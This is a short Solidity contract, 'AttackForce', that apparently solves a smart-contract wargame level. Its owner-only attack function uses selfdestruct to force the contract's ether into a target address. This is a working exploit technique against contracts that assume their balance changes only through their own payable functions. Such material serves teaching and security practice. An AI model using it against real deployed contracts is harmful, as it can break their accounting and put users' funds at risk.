// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackForce {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() public payable {}

    function attack(address _target) public {
        require(msg.sender == owner, "You are not the owner");
        selfdestruct(payable(_target));
    }
}